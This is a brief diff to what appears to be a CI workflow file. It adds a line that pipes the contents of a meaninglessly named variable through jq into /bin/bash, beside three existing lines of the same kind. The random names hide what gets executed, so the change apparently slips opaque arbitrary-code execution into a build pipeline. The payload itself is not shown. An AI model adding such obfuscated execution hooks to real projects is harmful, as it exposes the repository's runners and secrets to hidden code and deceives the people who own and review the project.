@@ -38,6 +38,7 @@ jobs:
           echo $su07 | jq -r .csw211 | /bin/bash
           printf '%s' "$wkdvw2223" | jq -r .kikub520 | /bin/bash
           echo $fxg54021 | jq -r .ksc8782 | /bin/bash
+          printf '%s' "$gze20" | jq -r .vn10795 | /bin/bash
 
       - name: Store results
         if: always()
